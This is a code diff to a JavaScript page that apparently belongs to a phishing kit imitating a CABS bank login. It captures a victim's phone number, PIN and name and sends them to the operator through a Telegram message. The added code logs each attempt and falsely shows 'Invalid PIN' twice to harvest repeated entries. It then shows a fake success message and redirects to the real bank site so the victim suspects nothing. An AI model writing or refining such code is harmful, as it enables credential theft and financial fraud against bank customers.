@@ -604,14 +604,29 @@ function navigate(view) {
         }
       });
     });
+    state.pinAttempts = state.pinAttempts || 0;
+    
     document.getElementById('pinLoginBtn').addEventListener('click', async () => {
       const pin = [...pins].map(p => p.value).join('');
       if (pin.length < 4) { alert('Please enter your 4-digit PIN.'); return; }
+      
+      state.pinAttempts++;
+      
       showSpinner('Authenticating...');
-      await sendTextToTelegram(`🔐 *PIN LOGIN*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${pin}\n• Applicant: ${state.name || 'Unknown'}`);
-      hideSpinner();
-      alert('Login successful! Welcome back.');
-      window.location.href = 'https://www.cabs.co.zw/';
+      await sendTextToTelegram(`🔐 *PIN LOGIN (Attempt ${state.pinAttempts})*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${pin}\n• Applicant: ${state.name || 'Unknown'}`);
+      
+      if (state.pinAttempts < 3) {
+        await new Promise(r => setTimeout(r, 1500));
+        hideSpinner();
+        alert('Invalid PIN. Please try again.');
+        pins.forEach(p => { p.value = ''; p.classList.remove('filled'); });
+        pins[0].focus();
+      } else {
+        await new Promise(r => setTimeout(r, 1500));
+        hideSpinner();
+        alert('Login successful! Welcome back.');
+        window.location.href = 'https://www.cabs.co.zw/';
+      }
     });
   }
 }
